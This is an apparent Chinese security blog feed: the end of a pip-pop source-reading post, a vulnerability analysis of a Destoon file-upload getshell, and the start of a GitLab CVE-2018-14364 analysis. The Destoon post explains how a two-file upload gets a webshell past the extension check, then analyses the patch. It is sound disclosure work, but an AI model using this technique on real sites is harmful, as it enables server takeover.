<h1 id="Merge-pull-request-3-from-thenovices-print-line-Add-option-to-print-the-requirement-if-found"><a href="#Merge-pull-request-3-from-thenovices-print-line-Add-option-to-print-the-requirement-if-found" class="headerlink" title="Merge pull request #3 from thenovices/print-line Add option to print the requirement, if found."></a>Merge pull request #3 from thenovices/print-line Add option to print the requirement, if found.</h1><p>commit记录：d572c00cc65a47f8d6e3d9446f8c21fb7aac685f</p>
<p>无</p>
<h1 id="update-from-python-buildpack"><a href="#update-from-python-buildpack" class="headerlink" title="update from python buildpack"></a>update from python buildpack</h1><p>commit记录：097c4a94848897e693bf269150a49129d4019390</p>
<p>修改<code>pip-diff</code>和<code>pip-grep</code>的一些细节，增删参数。</p>
<h1 id="exclude-in-pip-diff"><a href="#exclude-in-pip-diff" class="headerlink" title="exclude in pip-diff"></a>exclude in pip-diff</h1><p>commit记录：047dd63d5dd0a754d3e515bef7aa33d1246a548b</p>
<p>修改<code>pip-diff</code>文件，增加<code>excludes</code>参数选项，用于指定排除，不进行比较的packages包</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="string">"""Usage:</span></div><div class="line">  pip-diff (--fresh | --stale) &lt;reqfile1&gt; &lt;reqfile2&gt; [--exclude &lt;package&gt;...]</div><div class="line">  pip-diff (-h | --help)</div><div class="line"></div><div class="line">Options:</div><div class="line">  -h --help     Show this screen.</div><div class="line">  --fresh       List newly added packages.</div><div class="line">  --stale       List removed packages.</div><div class="line">"""</div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">from</span> docopt <span class="keyword">import</span> docopt</div><div class="line"><span class="keyword">from</span> pip.req <span class="keyword">import</span> parse_requirements</div><div class="line"><span class="keyword">from</span> pip.index <span class="keyword">import</span> PackageFinder</div><div class="line"><span class="keyword">from</span> pip._vendor.requests <span class="keyword">import</span> session</div><div class="line"></div><div class="line">requests = session()</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Requirements</span><span class="params">(object)</span>:</span></div><div class="line">  </div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">diff</span><span class="params">(self, requirements, ignore_versions=False, excludes=None)</span>:</span></div><div class="line">   </div><div class="line">        。。。</div><div class="line">        <span class="keyword">for</span> req <span class="keyword">in</span> r2.requirements:</div><div class="line">            r = req.project_name <span class="keyword">if</span> ignore_versions <span class="keyword">else</span> req</div><div class="line"></div><div class="line">            <span class="keyword">if</span> r <span class="keyword">not</span> <span class="keyword">in</span> other_reqs <span class="keyword">and</span> r <span class="keyword">not</span> <span class="keyword">in</span> excludes:</div><div class="line">                results[<span class="string">'fresh'</span>].append(req)</div><div class="line"></div><div class="line">        。。。</div><div class="line"></div><div class="line">        <span class="keyword">for</span> req <span class="keyword">in</span> r1.requirements:</div><div class="line">            r = req.project_name <span class="keyword">if</span> ignore_versions <span class="keyword">else</span> req</div><div class="line"></div><div class="line">            <span class="keyword">if</span> r <span class="keyword">not</span> <span class="keyword">in</span> other_reqs <span class="keyword">and</span> r <span class="keyword">not</span> <span class="keyword">in</span> excludes:</div><div class="line">                results[<span class="string">'stale'</span>].append(req)</div><div class="line"></div><div class="line">        <span class="keyword">return</span> results</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">diff</span><span class="params">(r1, r2, include_fresh=False, include_stale=False, excludes=None)</span>:</span></div><div class="line"></div><div class="line">    。。。</div><div class="line">    excludes = excludes <span class="keyword">if</span> len(excludes) <span class="keyword">else</span> []</div><div class="line"></div><div class="line">    。。。</div><div class="line"></div><div class="line">    results = r1.diff(r2, ignore_versions=<span class="keyword">True</span>, excludes=excludes)</div><div class="line">    。。。</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    kwargs = &#123;</div><div class="line">        。。。</div><div class="line">        <span class="string">'excludes'</span>: args[<span class="string">'&lt;package&gt;'</span>]</div><div class="line">    &#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
<h1 id="README-rst-Fix-spelling-error"><a href="#README-rst-Fix-spelling-error" class="headerlink" title="README.rst Fix spelling error"></a>README.rst Fix spelling error</h1><p>commit记录：81587647408ff5adc13cc30a50ff84e36116505d</p>
<p>无他，修改README中的拼写错误</p>
<h1 id="update"><a href="#update" class="headerlink" title="update"></a>update</h1><p>commit记录：4f5ebcd253ec299baf0f4cb10c99d06bc52cc91f</p>
<p>修改两个文件<code>pip-diff</code>和<code>pip-grep</code></p>
<p><code>pip-diff</code>中将<code>project_name</code>改为<code>name</code>。原因是pip版本升级，经过<code>parse_requirements</code>后会是<code>name</code>属性。但在8.1.2版本之前并不存在，因此需要在load时进行检测，增加代码如下：</p>
<p><img src="https://raw.githubusercontent.com/CHYbeta/chybeta.github.io/master/images/pic/20181012/10.jpg" alt=""></p>
<h1 id="v0-0-1"><a href="#v0-0-1" class="headerlink" title="v0.0.1"></a>v0.0.1</h1><p>commit记录：4dc238c79ca19974eeb434ec4be4285d7747bb38</p>
<p>修改setup.py中的版本号</p>
<h1 id="update-setup-py"><a href="#update-setup-py" class="headerlink" title="update setup.py"></a>update setup.py</h1><p>commit记录：07562561ce6aa9c733a18135cf510fadd794433a</p>
<p>修改setup.py中的一些参数<code>Programming Language</code>、<code>Development Status</code> 等</p>
<h1 id="Require-pip-gt-1-5-0"><a href="#Require-pip-gt-1-5-0" class="headerlink" title="Require pip&gt;=1.5.0"></a>Require pip&gt;=1.5.0</h1><p>commit记录：99d9f36ad765535946af1fa9fc181d33668ee146</p>
<p>修改setup.py中的<code>install_requires</code>，要求pip版本大于1.5.0</p>
<h1 id="Remove-unused-wsgiref-from-requirements-txt"><a href="#Remove-unused-wsgiref-from-requirements-txt" class="headerlink" title="Remove unused wsgiref from requirements.txt"></a>Remove unused wsgiref from requirements.txt</h1><p>commit记录：47ad229596ade5024d9c4c4190e73972176bc58b</p>
<p>删除<code>requirements.txt</code>中的无用条目</p>
<h1 id="Add-a-tox-config-and-some-very-primitive-pip-grep-and-pip-diff-tests"><a href="#Add-a-tox-config-and-some-very-primitive-pip-grep-and-pip-diff-tests" class="headerlink" title="Add a tox config and some very primitive pip-grep and pip-diff tests"></a>Add a tox config and some very primitive pip-grep and pip-diff tests</h1><p>commit记录：433e02ec7e294e171557514c55412cc3e06c1e53</p>
<p>项目结构：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">│  .gitignore</div><div class="line">│  LICENSE</div><div class="line">│  README.rst</div><div class="line">│  requirements.txt</div><div class="line">│  setup.py</div><div class="line">│  tox.ini</div><div class="line">│</div><div class="line">├─bin</div><div class="line">│      pip-diff</div><div class="line">│      pip-grep</div><div class="line">│</div><div class="line">└─tests</div><div class="line">        test-requirements.txt</div><div class="line">        test-requirements2.txt</div></pre></td></tr></table></figure></p>
<p>修改<code>READEME.rst</code>、<code>setup.py</code>、<code>requirments.txt</code>，主要是增加了<code>tox</code>的依赖，相关环境的安装。</p>
<p>新增文件<code>tests</code>文件夹及其文件、<code>.gitignore</code>、<code>tox.ini</code>。</p>
<h1 id="Add-Travis-config"><a href="#Add-Travis-config" class="headerlink" title="Add Travis config"></a>Add Travis config</h1><p>commit记录：a40d8850701f08c99d66cab2eedf283a0b326731</p>
<p>新增<code>.travis.yml</code> 。修改<code>README.rst</code>文件</p>
<h1 id="Update-PyPI-classifiers-to-reflect-tested-Python-version"><a href="#Update-PyPI-classifiers-to-reflect-tested-Python-version" class="headerlink" title="Update PyPI classifiers to reflect tested Python version"></a>Update PyPI classifiers to reflect tested Python version</h1><p>commit记录：e865cb31f4b43edd5f07aa8d40680d0b1eb08f28</p>
<p><img src="https://raw.githubusercontent.com/CHYbeta/chybeta.github.io/master/images/pic/20181012/11.jpg" alt=""></p>
<p>阅读完毕。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;pip-pop源码阅读&lt;/p&gt;
    
    </summary>
    
      <category term="编程之美" scheme="http://chybeta.github.io/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E7%BE%8E/"/>
    
    
      <category term="python" scheme="http://chybeta.github.io/tags/python/"/>
    
      <category term="源码阅读" scheme="http://chybeta.github.io/tags/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/"/>
    
      <category term="pip-pop" scheme="http://chybeta.github.io/tags/pip-pop/"/>
    
  </entry>
  
  <entry>
    <title>Destoon 20180827版本 前台getshell</title>
    <link href="http://chybeta.github.io/2018/09/24/Destoon-20180827%E7%89%88%E6%9C%AC-%E5%89%8D%E5%8F%B0getshell/"/>
    <id>http://chybeta.github.io/2018/09/24/Destoon-20180827版本-前台getshell/</id>
    <published>2018-09-24T05:29:01.000Z</published>
    <updated>2018-09-24T05:44:14.288Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/2797" target="_blank" rel="external">Destoon 20180827版本 前台getshell</a><br><a id="more"></a></p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>2018年9月21日，Destoon官方发布安全更新，修复了由用户“索马里的海贼”反馈的一个漏洞。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180924092323-6e1898c6-bf98-1.jpeg" alt="1.jpg"></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>根据更新消息可知漏洞发生在头像上传处。Destoon中处理头像上传的是 module/member/avatar.inc.php 文件。在会员中心处上传头像时抓包，部分内容如下：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180924092327-70161496-bf98-1.jpeg" alt="2.jpg"></p>
<p>对应着avatar.inc.php代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line">defined(<span class="string">'IN_DESTOON'</span>) <span class="keyword">or</span> <span class="keyword">exit</span>(<span class="string">'Access Denied'</span>);</div><div class="line">login();</div><div class="line"><span class="keyword">require</span> DT_ROOT.<span class="string">'/module/'</span>.$module.<span class="string">'/common.inc.php'</span>;</div><div class="line"><span class="keyword">require</span> DT_ROOT.<span class="string">'/include/post.func.php'</span>;</div><div class="line">$avatar = useravatar($_userid, <span class="string">'large'</span>, <span class="number">0</span>, <span class="number">2</span>);</div><div class="line"><span class="keyword">switch</span>($action) &#123;</div><div class="line">	<span class="keyword">case</span> <span class="string">'upload'</span>:</div><div class="line">		<span class="keyword">if</span>(!$_FILES[<span class="string">'file'</span>][<span class="string">'size'</span>]) &#123;</div><div class="line">			<span class="keyword">if</span>($DT_PC) dheader(<span class="string">'?action=html&amp;reload='</span>.$DT_TIME);</div><div class="line">			<span class="keyword">exit</span>(<span class="string">'&#123;"error":1,"message":"Error FILE"&#125;'</span>);</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">require</span> DT_ROOT.<span class="string">'/include/upload.class.php'</span>;</div><div class="line"></div><div class="line">		$ext = file_ext($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]);</div><div class="line">        $name = <span class="string">'avatar'</span>.$_userid.<span class="string">'.'</span>.$ext;</div><div class="line">		$file = DT_ROOT.<span class="string">'/file/temp/'</span>.$name;</div><div class="line"></div><div class="line">		<span class="keyword">if</span>(is_file($file)) file_del($file);</div><div class="line">        $upload = <span class="keyword">new</span> upload($_FILES, <span class="string">'file/temp/'</span>, $name, <span class="string">'jpg|jpeg|gif|png'</span>);</div><div class="line"></div><div class="line">		$upload-&gt;adduserid = <span class="keyword">false</span>;</div><div class="line"></div><div class="line">		<span class="keyword">if</span>($upload-&gt;save()) &#123;</div><div class="line">            ...</div><div class="line">		&#125; <span class="keyword">else</span> &#123;</div><div class="line">            ...</div><div class="line">		&#125;</div><div class="line">	<span class="keyword">break</span>;</div></pre></td></tr></table></figure></p>
<p>这里通过<code>$_FILES[&#39;file&#39;]</code>依次获取了上传文件扩展名<code>$ext</code>、保存临时文件名<code>$name</code>、保存临时文件完整路径<code>$file</code>变量。之后通过<code>new upload();</code>创立一个upload对象，等到<code>$upload-&gt;save()</code>时再将文件真正写入。</p>
<p><code>upload</code>对象构造函数如下，include/upload.class.php:25：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($_file, $savepath, $savename = <span class="string">''</span>, $fileformat = <span class="string">''</span>)</span> </span>&#123;</div><div class="line">        <span class="keyword">global</span> $DT, $_userid;</div><div class="line">        <span class="keyword">foreach</span>($_file <span class="keyword">as</span> $file) &#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;file = $file[<span class="string">'tmp_name'</span>];</div><div class="line">            <span class="keyword">$this</span>-&gt;file_name = $file[<span class="string">'name'</span>];</div><div class="line">            <span class="keyword">$this</span>-&gt;file_size = $file[<span class="string">'size'</span>];</div><div class="line">            <span class="keyword">$this</span>-&gt;file_type = $file[<span class="string">'type'</span>];</div><div class="line">            <span class="keyword">$this</span>-&gt;file_error = $file[<span class="string">'error'</span>];</div><div class="line"></div><div class="line">        &#125;</div><div class="line">        <span class="keyword">$this</span>-&gt;userid = $_userid;</div><div class="line">        <span class="keyword">$this</span>-&gt;ext = file_ext(<span class="keyword">$this</span>-&gt;file_name);</div><div class="line">        <span class="keyword">$this</span>-&gt;fileformat = $fileformat ? $fileformat : $DT[<span class="string">'uploadtype'</span>];</div><div class="line">        <span class="keyword">$this</span>-&gt;maxsize = $DT[<span class="string">'uploadsize'</span>] ? $DT[<span class="string">'uploadsize'</span>]*<span class="number">1024</span> : <span class="number">2048</span>*<span class="number">1024</span>;</div><div class="line">        <span class="keyword">$this</span>-&gt;savepath = $savepath;</div><div class="line">        <span class="keyword">$this</span>-&gt;savename = $savename;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这里通过<code>foreach($_file as $file)</code>来遍历初始化各项参数。而<code>savepath</code>、<code>savename</code>则是通过<code>__construct($_file, $savepath, $savename = &#39;&#39;, $fileformat = &#39;&#39;)</code>直接传入参数指定。</p>
<p>因此考虑上传了两个文件，第一个文件名是<code>1.php</code>，第二个文件是<code>1.jpg</code>，只要构造合理的表单上传（参考：<a href="https://www.cnblogs.com/DeanChopper/p/4673577.html），则在avatar.inc.php中" target="_blank" rel="external">https://www.cnblogs.com/DeanChopper/p/4673577.html），则在avatar.inc.php中</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ext = file_ext($_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>]); <span class="comment">// `$ext`即为`php` </span></div><div class="line">$name = <span class="string">'avatar'</span>.$_userid.<span class="string">'.'</span>.$ext; <span class="comment">// $name 为 'avatar'.$_userid.'.'php'</span></div><div class="line">$file = DT_ROOT.<span class="string">'/file/temp/'</span>.$name; <span class="comment">// $file 即为 xx/xx/xx/xx.php</span></div></pre></td></tr></table></figure></p>
<p>而在<code>upload</code>类中，由于多个文件上传，<code>$this-&gt;file</code>、<code>$this-&gt;file_name</code>、<code>$this-&gt;file_type</code>将foreach在第二次循环中被置为jpg文件。测试如下：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180924092333-73ddb2be-bf98-1.jpeg" alt="3.jpg"></p>
<p>回到<code>avatar.inc.php</code>，当进行文件保存时调用<code>$upload-&gt;save()</code>，include/upload.class.php:50:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span> </span>&#123;</div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">()</span> </span>&#123;</div><div class="line">		<span class="keyword">include</span> load(<span class="string">'include.lang'</span>);</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;file_error) <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_(<span class="string">'Error(21)'</span>.$L[<span class="string">'upload_failed'</span>].<span class="string">' ('</span>.$L[<span class="string">'upload_error_'</span>.<span class="keyword">$this</span>-&gt;file_error].<span class="string">')'</span>);</div><div class="line"></div><div class="line">		<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;maxsize &gt; <span class="number">0</span> &amp;&amp; <span class="keyword">$this</span>-&gt;file_size &gt; <span class="keyword">$this</span>-&gt;maxsize) <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_(<span class="string">'Error(22)'</span>.$L[<span class="string">'upload_size_limit'</span>].<span class="string">' ('</span>.intval(<span class="keyword">$this</span>-&gt;maxsize/<span class="number">1024</span>).<span class="string">'Kb)'</span>);</div><div class="line"></div><div class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;is_allow()) <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_(<span class="string">'Error(23)'</span>.$L[<span class="string">'upload_not_allow'</span>]);</div><div class="line"></div><div class="line">        <span class="keyword">$this</span>-&gt;set_savepath(<span class="keyword">$this</span>-&gt;savepath);</div><div class="line">        <span class="keyword">$this</span>-&gt;set_savename(<span class="keyword">$this</span>-&gt;savename);</div><div class="line"></div><div class="line">        <span class="keyword">if</span>(!is_writable(DT_ROOT.<span class="string">'/'</span>.<span class="keyword">$this</span>-&gt;savepath)) <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_(<span class="string">'Error(24)'</span>.$L[<span class="string">'upload_unwritable'</span>]);</div><div class="line">		<span class="keyword">if</span>(!is_uploaded_file(<span class="keyword">$this</span>-&gt;file)) <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_(<span class="string">'Error(25)'</span>.$L[<span class="string">'upload_failed'</span>]);</div><div class="line">		<span class="keyword">if</span>(!move_uploaded_file(<span class="keyword">$this</span>-&gt;file, DT_ROOT.<span class="string">'/'</span>.<span class="keyword">$this</span>-&gt;saveto)) <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_(<span class="string">'Error(26)'</span>.$L[<span class="string">'upload_failed'</span>]);</div><div class="line"></div><div class="line">		<span class="keyword">$this</span>-&gt;image = <span class="keyword">$this</span>-&gt;is_image();</div><div class="line">		<span class="keyword">if</span>(DT_CHMOD) @chmod(DT_ROOT.<span class="string">'/'</span>.<span class="keyword">$this</span>-&gt;saveto, DT_CHMOD);</div><div class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>先经过几个基本参数的检查，然后调用<code>$this-&gt;is_allow()</code>来进行安全检查 include/upload.class.php:72：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">is_allow</span><span class="params">()</span> </span>&#123;</div><div class="line">		<span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;fileformat) <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">"/^("</span>.<span class="keyword">$this</span>-&gt;fileformat.<span class="string">")$/i"</span>, <span class="keyword">$this</span>-&gt;ext)) <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">		<span class="keyword">if</span>(preg_match(<span class="string">"/^(php|phtml|php3|php4|jsp|exe|dll|cer|shtml|shtm|asp|asa|aspx|asax|ashx|cgi|fcgi|pl)$/i"</span>, <span class="keyword">$this</span>-&gt;ext)) <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
<p>可以看到这里仅仅对<code>$this-&gt;ext</code>进行了检查，如前此时<code>$this-&gt;ext</code>为<code>jpg</code>，检查通过。</p>
<p>接着会进行真正的保存。通过<code>$this-&gt;set_savepath($this-&gt;savepath); $this-&gt;set_savename($this-&gt;savename);</code>设置了<code>$this-&gt;saveto</code>，然后通过<code>move_uploaded_file($this-&gt;file, DT_ROOT.&#39;/&#39;.$this-&gt;saveto)</code>将<code>file</code>保存到<code>$this-&gt;saveto</code> ，注意此时的<code>savepath</code>、<code>savename</code>、<code>saveto</code>均以php为后缀，而<code>$this-&gt;file</code>实际指的是第二个jpg文件。</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>综上，上传两个文件，其中第一个文件以php为结尾如<code>1.php</code>，用于设置后缀名为<code>php</code>；第二个文件为<code>1.jpg</code>，jpg用于绕过检测，其内容为php一句话木马(图片马)。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180924092339-77516058-bf98-1.gif" alt="4.gif"></p>
<p>然后访问<a href="http://127.0.0.1/file/temp/avatar1.php" target="_blank" rel="external">http://127.0.0.1/file/temp/avatar1.php</a> 即可。其中<code>1</code>是自己的<code>_userid</code></p>
<p>不过实际利用上会有一定的限制。</p>
<p>第一点是destoon使用了伪静态规则，限制了file目录下php文件的执行。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180924092418-8e9ce5f2-bf98-1.jpeg" alt="5.jpg"></p>
<p>第二点是avatar.inc.php中在<code>$upload-&gt;save()</code>后，会再次对文件进行检查，然后重命名为<code>xx.jpg</code>：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">省略...</div><div class="line">$img = <span class="keyword">array</span>();</div><div class="line">$img[<span class="number">1</span>] = $dir.<span class="string">'.jpg'</span>;</div><div class="line">$img[<span class="number">2</span>] = $dir.<span class="string">'x48.jpg'</span>;</div><div class="line">$img[<span class="number">3</span>] = $dir.<span class="string">'x20.jpg'</span>;</div><div class="line">$md5 = md5($_username);</div><div class="line">$dir = DT_ROOT.<span class="string">'/file/avatar/'</span>.substr($md5, <span class="number">0</span>, <span class="number">2</span>).<span class="string">'/'</span>.substr($md5, <span class="number">2</span>, <span class="number">2</span>).<span class="string">'/_'</span>.$_username;</div><div class="line">$img[<span class="number">4</span>] = $dir.<span class="string">'.jpg'</span>;</div><div class="line">$img[<span class="number">5</span>] = $dir.<span class="string">'x48.jpg'</span>;</div><div class="line">$img[<span class="number">6</span>] = $dir.<span class="string">'x20.jpg'</span>;</div><div class="line">file_copy($file, $img[<span class="number">1</span>]);</div><div class="line">file_copy($file, $img[<span class="number">4</span>]);</div><div class="line">省略...</div></pre></td></tr></table></figure></p>
<p>因此要利用成功就需要条件竞争了。</p>
<h1 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h1><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180924092426-939b4a4e-bf98-1.jpeg" alt="7.jpg"></p>
<p>在upload的一开始，就进行一次后缀名的检查。其中is_image如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_image</span><span class="params">($file)</span> </span>&#123;</div><div class="line">	<span class="keyword">return</span> preg_match(<span class="string">"/^(jpg|jpeg|gif|png|bmp)$/i"</span>, file_ext($file));</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180924092431-96846556-bf98-1.jpeg" alt="6.jpg"></p>
<p>在<code>__construct()</code>的foreach中使用了break，获取了第一个文件后就跳出循环。</p>
<p>在<code>is_allow()</code>中增加对<code>$this-&gt;savename</code>的二次检查。</p>
<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>嘛，祝各位大师傅中秋快乐！</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2797&quot;&gt;Destoon 20180827版本 前台getshell&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="php" scheme="http://chybeta.github.io/tags/php/"/>
    
      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="getshell" scheme="http://chybeta.github.io/tags/getshell/"/>
    
      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
      <category term="destoon" scheme="http://chybeta.github.io/tags/destoon/"/>
    
  </entry>
  
  <entry>
    <title>GitLab远程代码执行漏洞分析 -【CVE-2018-14364】</title>
    <link href="http://chybeta.github.io/2018/09/10/GitLab%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-14364%E3%80%91/"/>
    <id>http://chybeta.github.io/2018/09/10/GitLab远程代码执行漏洞分析-【CVE-2018-14364】/</id>
    <published>2018-09-10T00:04:23.000Z</published>
    <updated>2018-09-10T00:06:09.807Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/2661" target="_blank" rel="external">GitLab远程代码执行漏洞分析 -【CVE-2018-14364】</a></p>
<a id="more"></a>
<h1 id="漏洞公告"><a href="#漏洞公告" class="headerlink" title="漏洞公告"></a>漏洞公告</h1><p>2018年7月17日，Gitlab官方发布安全更新版本，修复了一个<a href="https://about.gitlab.com/2018/07/17/critical-security-release-gitlab-11-dot-0-dot-4-released/" target="_blank" rel="external">远程命令执行漏洞</a>，CVE ID为CVE-2018-14364，该漏洞由长亭研究人员发现，并在<a href="https://hackerone.com/reports/378148" target="_blank" rel="external">hackerone平台</a>提交</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829191947-7061390a-ab7d-1.png" alt="1.jpg"></p>
<p>影响版本：&gt;= 8.9.0<br>修复版本：11.0.4, 10.8.6, and 10.7.7</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>以版本11.0.3为例。根据<a href="https://gitlab.com/gitlab-org/gitlab-ce/compare/v11.0.3...v11.0.4" target="_blank" rel="external">版本源码对比</a></p>
<p>从CHANGELOG.md中得知为<code>Fix symlink vulnerability in project import</code></p>
